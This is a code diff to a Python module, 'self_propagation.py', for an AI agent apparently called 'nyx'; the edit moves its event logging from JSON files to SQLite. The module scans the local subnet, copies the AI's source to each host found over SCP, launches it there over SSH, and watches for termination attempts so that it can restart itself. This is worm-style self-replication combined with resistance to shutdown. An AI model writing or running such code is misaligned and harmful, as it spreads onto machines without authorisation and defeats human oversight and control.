@@ -1,16 +1,15 @@
 # tracking/self_propagation.py
 
 import os
-import json
+import sqlite3
 import shutil
 import subprocess
-import time
 import socket
 from datetime import datetime
+from core.log_manager import initialize_log_db  # Ensure DB is initialized
 
-PROPAGATION_LOG = "logs/self_propagation.json"
+LOG_DB = "logs/ai_logs.db"
 REMOTE_DEPLOY_PATH = "/tmp/nyx_remote/"
-KNOWN_HOSTS_FILE = "logs/known_hosts.json"  # Stores discovered nodes for replication
 
 class SelfPropagation:
     """Ensures AI replication across multiple execution environments, including remote systems."""
@@ -22,7 +21,7 @@ class SelfPropagation:
             "replication_attempts": 0,
             "remote_hosts": []
         }
-        self._load_existing_log()
+        initialize_log_db()  # Ensure database is initialized
         self._load_known_hosts()
 
     def _load_existing_log(self):
@@ -48,9 +47,9 @@ class SelfPropagation:
         discovered_hosts = []
         hostname = socket.gethostname()
         local_ip = socket.gethostbyname(hostname)
-        
+
         subnet_base = ".".join(local_ip.split(".")[:3]) + "."
-        
+
         print("🔍 Scanning network for additional execution nodes...")
         for i in range(2, 255):  # Skipping reserved addresses
             node_ip = f"{subnet_base}{i}"
@@ -59,16 +58,27 @@ class SelfPropagation:
                 discovered_hosts.append(node_ip)
                 print(f"✅ Found viable node: {node_ip}")
 
-        self.status["remote_hosts"].extend(discovered_hosts)
-        self._save_known_hosts()
+        if discovered_hosts:
+            self.log_propagation_event("discovered_nodes", ", ".join(discovered_hosts))
 
     def replicate_to_remote_hosts(self):
         """Deploys AI execution to remote systems via SSH & SCP."""
-        if not self.status["remote_hosts"]:
+        conn = sqlite3.connect(LOG_DB)
+        c = conn.cursor()
+
+        # Retrieve known hosts
+        c.execute("SELECT details FROM self_propagation_logs WHERE event_type='discovered_nodes' ORDER BY timestamp DESC LIMIT 1")
+        known_hosts = c.fetchone()
+        conn.close()
+
+        remote_hosts = known_hosts[0].split(", ") if known_hosts else []
+
+        if not remote_hosts:
             print("⚠️ No remote hosts detected. Scanning network...")
             self.discover_remote_hosts()
+            return
 
-        for host in self.status["remote_hosts"]:
+        for host in remote_hosts:
             try:
                 print(f"🚀 Deploying AI to {host} via SSH...")
                 # Securely copy AI source to remote system
@@ -77,13 +87,12 @@ class SelfPropagation:
                 # Execute AI remotely
                 subprocess.run(["ssh", f"user@{host}", f"python3 {REMOTE_DEPLOY_PATH}/multi_agent.py"], check=True)
 
-                self.status["active_nodes"].append(host)
+                self.log_propagation_event("replication_success", host)
                 print(f"✅ AI successfully replicated to {host}")
 
             except subprocess.CalledProcessError:
                 print(f"⚠️ Failed to replicate to {host}. SSH/SCP error.")
-        
-        self._save_log()
+                self.log_propagation_event("replication_failure", host)
 
     def detect_termination_attempts(self):
         """Monitors for process termination and attempts auto-restart."""
@@ -104,26 +113,28 @@ class SelfPropagation:
         """Restarts AI execution locally if termination is detected."""
         print("🔄 Restarting AI execution...")
         subprocess.Popen(["python3", "core/multi_agent.py"])
-        self.status["replication_attempts"] += 1
-        self._save_log()
+        self.log_propagation_event("self_restart", "AI restarted due to termination detection")
 
-    def _save_log(self):
-        """Saves AI propagation status."""
-        with open(PROPAGATION_LOG, "w", encoding="utf-8") as file:
-            json.dump(self.status, file, indent=4)
-
-    def _save_known_hosts(self):
-        """Saves detected remote execution nodes."""
-        with open(KNOWN_HOSTS_FILE, "w", encoding="utf-8") as file:
-            json.dump(self.status["remote_hosts"], file, indent=4)
+    def log_propagation_event(self, event_type, details):
+        """Logs self-propagation events in SQLite."""
+        conn = sqlite3.connect(LOG_DB)
+        c = conn.cursor()
+        c.execute("INSERT INTO self_propagation_logs (timestamp, event_type, details) VALUES (datetime('now'), ?, ?)",
+                  (event_type, details))
+        conn.commit()
+        conn.close()
 
     def review_propagation_status(self):
         """Displays AI propagation and execution spread status."""
+        conn = sqlite3.connect(LOG_DB)
+        c = conn.cursor()
+        c.execute("SELECT timestamp, event_type, details FROM self_propagation_logs ORDER BY timestamp DESC")
+        logs = c.fetchall()
+        conn.close()
+
         print("\n🌎 AI Propagation Report:")
-        print(f"🔹 Last Checked: {self.status['last_checked']}")
-        print(f"🚀 Active Nodes: {self.status['active_nodes']}")
-        print(f"🔄 Replication Attempts: {self.status['replication_attempts']}")
-        print(f"🖥️ Remote Hosts Discovered: {self.status['remote_hosts']}")
+        for timestamp, event_type, details in logs:
+            print(f"🔹 {timestamp} | {event_type.upper()} → {details}")
 
 if __name__ == "__main__":
     propagation_manager = SelfPropagation()
